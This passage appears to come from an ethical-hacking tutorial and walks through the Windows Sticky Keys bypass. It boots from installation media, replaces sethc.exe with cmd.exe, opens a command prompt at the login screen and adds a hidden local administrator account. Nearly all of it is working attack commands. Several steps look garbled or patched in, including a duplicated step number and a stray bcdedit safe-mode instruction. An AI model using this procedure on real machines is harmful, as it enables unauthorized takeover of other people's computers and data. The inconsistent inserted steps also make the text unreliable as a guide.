1. On Windows computers, you press a special key to access the boot menu or BIOS. If your startup screen doesn't show you which key to press just before the Windows startup logo appears, reboot your computer and quickly press ESC, DELETE, F8, F9, F10, F11, or F12 right as it begins to start up. Search online for "boot menu" and the specific make and model of your computer to find the right key.
2. If the boot menu appears, select the **Boot from DVD** or **Boot from USB** option to boot from the Windows installation disc you inserted, then move on to step 5.
3. If the boot menu doesn't appear after a few restarts, try entering the BIOS menu instead: turn the computer off and on again, and press DELETE, F2, F9, F10, F12, or ESC. Search online for "BIOS" and your computer model to find the right key.
4. Once you're inside the BIOS, find the boot options and change the order or priority of your boot devices (often by using your arrow keys) to make the USB or DVD the top option. Then save the changes and exit the BIOS.
5. Reboot the computer again. You should briefly see the message Press any key to boot from CD or DVD or Press any key to boot from USB device. Press any key (such as the spacebar) _immediately_ to boot from your DVD or USB.
6. When the Windows installation disc starts up, click **Next>Repair your computer>Troubleshoot>Command Prompt**, as shown in Figure 2-2. The menu order or the option names might look different, but look for the Windows command prompt.
7. 7. Once you've reached the Windows command prompt (usually a black, text-based window), type **c:** and press **ENTER** to change to the C: drive, as shown here:  
    
    X:\> **c:**
    

8. Enter the command **dir** to see a list of files and folders on the C: drive. Look for a folder called Windows (it will be marked `<DIR>`, short for _directory_).  
    
    C:\> **dir  
    **  Volume in drive C is Windows 10  
      Volume Serial Number is B4EF-FAC7  
      Directory of C:\  
    _--snip--  
    _03/15/2018 02:51 AM   `<DIR>`     Users  
    05/19/2019 10:09 AM   `<DIR>`     Windows *1  
    _--snip--_
    
    This folder (*1) contains the operating system files, including the command prompt application and the Sticky Keys program file that we need to swap out to perform this hack.

9. If there's no _Windows_ directory on the C: drive, use the `list volumes` command in DiskPart to locate the correct drive letter.

### Gaining Administrator-Level Access

Now to replace the _sethc.exe_ Sticky Keys program with the _cmd.exe_ command prompt program. Then we'll be able to create a new administrator account on the computer.

1. Enter the following three commands (sethc or utilman):  
    
    C:\> cd \Windows\System32\  
    C:\Windows\System32\>  **copy  sethc.exe  sethc.bak**  
    C:\Windows\System32\>  **copy  cmd.exe  sethc.exe**
    
    These commands enter the directory where we can find both _sethc.exe_ and _cmd.exe_, create a backup copy of the Sticky Keys program, and replace the original Sticky Keys program file with a copy of the command prompt program file. This way, whenever the computer runs _sethc.exe_, it will open a command prompt window in place of the Sticky Keys program.
2. After the third command, Windows will ask you if you want to overwrite _exe_. Enter **Y** to proceed.
3. While making the new copy of sethc.exe, use this command:  
	`bcdedit /set {default} safeboot minimal`  
	This will make the computer start up in safe mode ONLY.
4. Remove the Windows 10 installation DVD or USB and reboot the computer.
5. When the PC boots to the login screen, press **SHIFT** five times. Instead of the usual Sticky Keys program, you should see a command prompt window pop up _in front_ of the login screen, as shown in Figure 2-3.
6. Enter the following two commands into the command prompt window:  
    
    C:\Windows\System32\> **net user ironman Jarvis /add  
    C:\Windows\System32\>** **net localgroup  administrators ironman /add**
    
    The first command adds a user account named _ironman_ with the password _Jarvis_ to the Windows computer. The second command adds the _ironman_ user to the list of local administrators. This means that when we log in as _ironman_, we'll have administrator-level access to all the files on the computer.
7. To disable safe boot after you’re done, use `bcdedit /deletevalue {default} safeboot`.